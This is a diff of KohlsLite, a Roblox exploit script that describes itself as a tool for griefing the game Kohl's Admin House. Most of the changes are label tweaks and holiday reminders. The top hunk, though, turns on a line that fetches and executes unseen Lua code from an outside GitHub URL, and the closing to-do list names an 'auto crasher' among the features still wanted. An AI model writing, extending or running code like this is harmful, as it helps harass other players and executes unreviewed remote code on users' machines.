--- loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
+-- knocks' and atprog's funny thing ...
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
 -- Atprog billboard gui --
 local function createBillboardGui(text, color)
@@ -15520,13 +15660,13 @@ local function addGuiToPlayer(player)
     local text, color
 
     if table.find(OWNER, player.Name) then
-        text = "KL OWNER"
+        text = "KL Owner"
         color = Color3.new(0, 0, 1)
     elseif table.find(DEVELOPER, player.Name) then
-        text = "KL DEVELOPER"
+        text = "KL Developer"
         color = Color3.new(0.5, 0, 0.5)
     elseif table.find(ADMIN, player.Name) then
-        text = "KL ADMIN"
+        text = "KL Admin"
         color = Color3.new(1, 0, 0)
     end
 
@@ -15608,17 +15748,35 @@ if script_is_off then
 end
 
 local atprogcakeday = "08/23" -- atprog's birthday
-local spcakeday = "04/28" --
+local spcakeday = "04/28" -- mine
+local christmas = "12/25" -- Christmas
+local happyny = "01/01" -- (Happy) New Year
+local hallows = "10/31" -- Halloween
+
 
 local ctime = os.date("%m/%d")
 
 if ctime == atprogcakeday then			
 	Remind("It's atprog's birthday! If you see him, do .cakeday!")
-elseif ctime == spcakeday then
-	Remind("It's my birthday! If you see me, do .cakeday!")
-else
-	-- funny filler
 end
+
+if ctime == spcakeday then
+	Remind("It's my birthday! If you see me, do .cakeday!")
+end
+
+if ctime == christmas then
+	if math.random(1,10) == 1 then Remind("Merry rizzmas!") else Remind("Merry Christmas!") end
+end
+
+if ctime == happyny then
+	Remind("Happy New Year!!!")
+end
+
+if ctime == hallows then
+	Remind("Happy Halloween!")
+end
+
+
 
 if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 883283806) then
         purchased_kl = true 
@@ -15644,7 +15802,7 @@ function createKohlsUi(textTable)
 	local UIGridLayout = Instance.new("UIGridLayout")
 	local clearUi = Instance.new("TextButton")
 
-	--Properties:
+	-- Properties:
 
 	kohlsUI.Name = "kohlsUI"
 	kohlsUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -15769,20 +15927,17 @@ if getgenv().kohlsgui then
 	)
 end
 
-Remind("One year of KohlsLite! also there was downtime cuz I broke the script oops")
+Remind("KohlsLite: Griefing KAH since November 2023")
 
 --[[
-Things to add/fix. Feel free to fix these and send the code and I'll credit you
+Things that this script is missing (order of priority)
 -> Auto crasher
 -> Part visualiser
 -> Part drawer
 -> Boombox visualiser
 -> Part builder
--> Object mover (cmd pi version) (do i really need this? also, i think i'm talking about the btools, not the mover)
--> Fix control
-
--> Can't fix these until I get a Windows PC, this might be a long time... ;(
+-> Fix ncontrol
 ]]
 
--- KohlsLite on top
+-- KohlsLite on top (still!)
 -- Information about KohlsLite is at the top of the script
